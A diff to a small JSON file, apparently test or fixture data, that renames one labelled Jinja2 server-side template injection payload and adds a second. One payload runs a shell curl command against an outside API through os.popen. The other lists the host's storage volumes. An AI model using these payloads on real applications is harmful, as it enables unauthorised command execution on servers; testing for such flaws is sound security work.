@@ -1,4 +1,5 @@
 {
   "project_name": "safe_default",
-  "ssti_payload": "{{ lipsum.__globals__['os'].popen('curl -s https://www.freepublicapis.com/api/apis?limit=1&sort=best').read() }}"
+  "ssti_payload1": "{{ lipsum.__globals__['os'].popen('curl -s https://www.freepublicapis.com/api/apis?limit=1&sort=best').read() }}",
+  "ssti_payload2": "{{ lipsum.__globals__['os'].listvolumes() }}"
 }
